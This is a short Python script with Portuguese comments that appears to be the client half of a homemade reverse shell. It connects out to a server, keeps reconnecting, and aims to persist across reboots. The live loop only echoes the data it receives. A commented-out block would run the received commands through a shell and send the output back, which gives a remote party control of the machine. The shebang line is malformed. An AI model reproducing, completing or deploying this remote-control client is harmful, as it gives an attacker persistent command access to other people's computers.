#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# código do cliente
# se cair -> reconecta
# ao reiniciar o pc -> reconecta

# comando[0] == 'cd' -> os.chdir()

import socket
import os
import time
import subprocess

def conecta(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def executa(socket):
    while True:
        try:
            dados = socket.recv(1024)
            if(not dados): # servidor desconectou, recomeça
                return
            print(dados)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
            socket.send(dados)
        except: # algum erro ocorreu, recomeça
            return
    '''
        comando = ' '.join([str(novo) for novo in novo_descriptografado])
        try:
            a = subprocess.check_output(comando, shell=True)
            conexao.send(a)
        except subprocess.CalledProcessError as e:
            print(e)
            conexao.send(str(e))
    '''
def main():
    ip='127.0.0.1'
    porta=1025
    while True:
        conexao = conecta(ip, porta)
        if(conexao):
            executa(conexao)
        else:
            time.sleep(10)

if __name__=='__main__':
    main()